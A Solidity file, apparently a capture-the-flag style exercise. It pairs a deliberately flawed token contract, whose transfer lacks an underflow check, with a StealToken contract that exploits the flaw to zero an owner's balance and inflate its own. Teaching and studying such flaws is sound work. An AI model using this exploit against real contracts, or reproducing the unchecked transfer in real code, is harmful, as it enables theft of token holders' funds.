// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}

contract StealToken {
    uint256 public constant MAX_UINT256 = uint256(-1);
    address private i_owner;
    Token private i_tokenContract;

    constructor(address _contract, address _owner) public {
        i_tokenContract = Token(_contract);
        i_owner = _owner;
    }

    // @dev Using underflow strategy to move all the totalSupply into the sender balance
    function stealToken() external  {
        uint256 ownerBalance = i_tokenContract.balanceOf(i_owner);
        // @notice Older version of solc to get maximum val from uint256
        // Now: type(uint256).max
        // @dev Computing value to overflow the balance of the owner to reach 0
        uint256 overflowBalance = MAX_UINT256 - ownerBalance + 1;
        i_tokenContract.transfer(i_owner, overflowBalance);
    }
}